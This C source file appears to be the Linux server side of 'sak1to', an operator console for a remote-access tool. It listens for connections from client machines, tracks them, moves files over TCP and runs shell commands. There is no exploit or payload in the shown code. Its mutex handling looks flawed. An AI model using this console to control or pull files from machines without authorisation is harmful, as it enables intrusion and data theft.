/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#define CONSOLE_FSTR "sak1to-console:~%s$ "
#define INTERACT_FSTR "┌%d─%s\n└%s>"
#define LINUX 1
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define INVALID_FILE -1
#define READ 1
#define WRITE 0

typedef int s_file;

// Mutex lock for pthread race condition checks.
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
// Variable for mutex condition.
pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;

typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	SOCKET sock;

} Conn;

typedef struct {
	// Server buffer.
	char buf[BUFLEN + 1];

	// Server socket for accepting connections.
	int listen_socket;

	// Pthread object for handling execution/termination of accept_conns thread.
	pthread_t acp_thread;

	// Flag for race condition checks.
	int THRD_FLAG;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t clients_alloc;

	// Amount of memory used.
	size_t clients_sz;

} Server_map;

void bind_socket(const SOCKET listen_socket);
void sakito_accept_conns(Server_map* const s_map);
void resize_conns(Server_map* const s_map, int client_id);


// Linux sakito-API wrapper for storing current working directory in a provided buffer.
void get_cwd(char *buf) 
{

	getcwd(buf, BUFLEN);
}

// Linux sakito-API wrapper for terminating server.
void terminate_server(int listen_socket, const char* const error) 
{
	close(listen_socket);
	int err_code = EXIT_SUCCESS;
	if (error) 
	{
		err_code = 1;
		perror(error);
	}

	exit(err_code);
}

// Linux sakito-API wrapper for to creating a socket object.
int create_socket() 
{
	// Create the server socket object.
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) 
	{
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int) {1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}

// Linux mutex lock function.
void mutex_lock(Server_map* const s_map) 
{
	// Wait until THRD_FLAG evaluates to false.
	while (s_map->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);

	pthread_mutex_lock(&lock);

	// We're now locking the mutex so we can modify shared data in a thread safe manner.
	s_map->THRD_FLAG = 1;
}

// Linux mutex unlock function.
void mutex_unlock(Server_map* const s_map) 
{
	pthread_mutex_unlock(&lock);

	// Set THRD_FLAG to false to communicate with mutex_lock() that we have finished modifying shared data.
	s_map->THRD_FLAG = 0;
}

// Linux sakito-API/ wrapper for write() syscall.
int sakito_tcp_send(const SOCKET socket, const char* buf, const size_t count) 
{

	return write(socket, buf, count);
}

// Linux sakito-API/ wrapper for read() syscall.
int sakito_tcp_recv(const SOCKET socket, char* const buf, const size_t count) 
{

	return read(socket, buf, count);
}

// Linux sakito-API/ wrapper for write()'ing to stdout.
int write_stdout(const char* buf, size_t count) 
{

	return write(STDOUT_FILENO, buf, count);
}

// Linux open() wrapper/sakito-API to return s_file which is a typedef alias for int/file descriptors.
s_file sakito_open_file(const char* filename, int rw_flag) 
{
	// Supports only read/write modes.
	if (rw_flag == WRITE)
		return open(filename, O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
	else if (rw_flag == READ)
		return open(filename, O_RDONLY);

	return INVALID_FILE;
}

// Linux sakito-API/wrapper for close().
int sakito_close_file(s_file file) 
{

	return close(file);
}

// Linux sakito-API to wrap read/write syscalls and file share logic (receive) for linux.
int sakito_recv_file(const SOCKET socket, s_file file, char* const buf, int32_t f_size) 
{
	// Varaible to keep track of downloaded data.
	int i_result = SUCCESS;
	int32_t total = 0;
	do
		i_result = read(socket, buf, BUFLEN);
	while ((i_result > 0)
			&& (write(file, buf, i_result))
			&& ((total += i_result) != f_size));

	return i_result;
}


// Linux sakito-API to calculate file size of a given s_file/file descriptor.
int32_t sakito_file_size(s_file file) 
{
	int32_t f_size = (int32_t)lseek(file, 0, SEEK_END);
	// Return file descriptor to start of file.
	lseek(file, 0, SEEK_SET);

	return f_size;
}

// Linux sakito-API to wrap read/write syscalls and file share logic (send) for linux.
int sakito_send_file(const SOCKET socket, s_file file, char* const buf, int32_t f_size) 
{
	// Calculate file size and serialize the file size integer.
	uint32_t bytes = htonl(f_size);

	// Send the serialized file size bytes.
	if (write(socket, (char*)&bytes, sizeof(uint32_t)) < 1)
		return SOCKET_ERROR;

	int i_result = SUCCESS;

	// Send file bytes to client in BUFLEN chunks.
	if (f_size > 0) 
	{
		int bytes_read;
		while ((i_result > 0) && (bytes_read = read(file, buf, BUFLEN)))
			// Send file's bytes chunk to remote server.
			i_result = write(socket, buf, bytes_read);
	}

	return i_result;
}

// Wrapper function for close() to match Windows' closesocket() API's signature.
void closesocket(SOCKET socket) 
{

	close(socket);
}

// Linux sakito-API for executing a command via the host system.
void exec_cmd(Server_map* const s_map) 
{
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = popen(s_map->buf, "r");

	// Stream/write command output to stdout.
	int rb = 0;
	do 
	{
		rb = fread(s_map->buf, 1, BUFLEN, fpipe);
		fwrite(s_map->buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Close the pipe.
	pclose(fpipe);
}

// Linux sakito-API for terminating the console application and server. 
void terminate_console(Server_map* const s_map) 
{
	// Quit accepting connections.
	pthread_cancel(s_map->acp_thread);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			close(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	terminate_server(s_map->listen_socket, NULL);
}

// Thread to recursively accept connections.
void* accept_conns(void* param) 
{
	// Call sakito wrapper function to accept incoming connections.
	Server_map* const s_map = (Server_map*)param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	sakito_accept_conns(s_map);

	return NULL;
}

// Linux sakito-API for initialization of the console application and server.
void sakito_init(Server_map* const s_map) 
{
	// Set out race condition flag to false.
	s_map->THRD_FLAG = 0;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&s_map->acp_thread , NULL, accept_conns, s_map);
}
